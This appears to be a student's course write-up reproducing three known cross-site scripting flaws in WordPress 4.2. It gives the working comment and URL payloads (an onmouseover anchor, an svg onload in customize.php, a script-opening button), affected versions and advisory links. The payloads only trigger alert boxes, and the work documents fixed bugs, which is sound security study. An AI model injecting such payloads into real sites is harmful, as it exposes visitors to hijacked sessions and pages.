# cybersecurityweek7-8
Time spent total: 8 hours in total
## Exploit 1 - Persistent XSS Vulnerability in WordPress
How to reproduce:

1. This is in WordPress version 4.2.
2. Paste the following as a comment on a post:
```
<a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>
```
3. The comment will look blank.
4. An alert will pop up with the message 1.
>Sources\
[Source 1](http://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html)

This is an XSS Attack which is fixed in WordPress version 4.2.4.

Below is a gif of me doing the exploit on my own WordPress site.
![GIF](https://imgur.com/UfFwyK3.gif)

## Exploit 2 - Authenticated Cross-Site Scripting
How to reproduce:

1. This is in WordPress version 4.2.
2. Paste the following as a comment on a post:
```
http://www.example.com/wp-admin/customize.php?theme=<svg onload=alert(1)>
```
or
```
http://www.example.com/wp-admin/customize.php?theme=<svg onload=alert("error")>
```
3. You should see a comment with a hyperlink and the alert should pop up as well.
4. Interestingly if your comment has spaces, it will not show up as an alert. But it will still show up as an incomplete hyperlink in the comments.

>Sources\
[Source 1](https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87)\
[Source 2](https://wpvulndb.com/vulnerabilities/8358)

This is an XSS Attack which affects versions 3.7 to 4.2.5 and fixed in 4.2.6, it also appears in 4.3 to 4.3.1 and fixed in 4.3.2 and appears in 4.4 and fixed in 4.4.1. (See Source 2 for details)

Below is a gif of me doing the exploit on my own WordPress site.
![GIF](https://i.imgur.com/jfXKxLg.gif)

## Exploit 3 - 
How to reproduce:

1. This is in WordPress version 4.2.
2. Paste the following as a comment on a post:
```
<button onclick="fire()">Click</button>
<script>
function fire() {
 open('javascript:alert(1)');
}
</script>
```
or
```
<button onclick="fire()">Download</button>
<script>
function fire() {
 open('javascript:alert(Virus)');
}
</script>
```
3. Click on the button.
4. A new tab should open up along with the alert.

This is an XSS attack it affects the following versions

Affected|Fixed In
--------|--------
3.7-3.7.13|3.7.14
3.8-3.8.13|3.8.14
3.9-3.9.11|3.9.12
4.0-4.1.10|4.1.11
4.2-4.2.7|4.2.8
4.3-4.3.3|4.3.4
4.4-4.4.2|4.4.3
4.5-4.5.1|4.5.2

>Sources\
[Source 1](https://wordpress.org/news/2016/05/wordpress-4-5-2/)\
[Source 2](https://wpvulndb.com/vulnerabilities/8489)

Below is a gif of me doing the exploit on my own WordPress site.
![GIF](https://i.imgur.com/x9hEU5l.gif)
